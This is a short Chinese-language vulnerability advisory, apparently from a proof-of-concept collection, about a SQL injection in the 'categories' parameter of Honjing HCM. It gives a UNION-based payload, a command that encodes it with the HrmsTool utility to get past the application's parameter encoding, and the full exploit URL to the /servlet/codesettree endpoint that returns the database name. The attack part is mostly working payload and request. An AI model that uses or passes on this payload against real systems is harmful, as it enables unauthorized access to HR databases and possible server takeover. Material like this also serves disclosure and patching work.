#### 影响范围

宏景HCM

#### 漏洞概述

宏景HCM多维度组织维护便捷，机构图展示形式更加符合潮流，全模块适配海量数据库,数据的利用率和一致性进一步提高，UI焕新上线、应用全面升级，宏景HCM categories处存在SQL注入漏洞，攻击者可以从其中获取服务器权限

#### 漏洞复现

使用github上的hrmstool加解密工具进行转换

https://github.com/vaycore/HrmsTool

```
#初始载荷
1' union all select 'hellohongjingHcm',db_name()--
    
#转换载荷
java -jar HrmsTool.jar -e "1' union all select 'hellohongjingHcm',db_name()--"
=>
~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2cdb~5fname~28~29~2d~2
```

执行POC查询hellohongjingHcm和db_name()，得到查询结果

 ```
 /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2cdb~5fname~28~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1
 ```





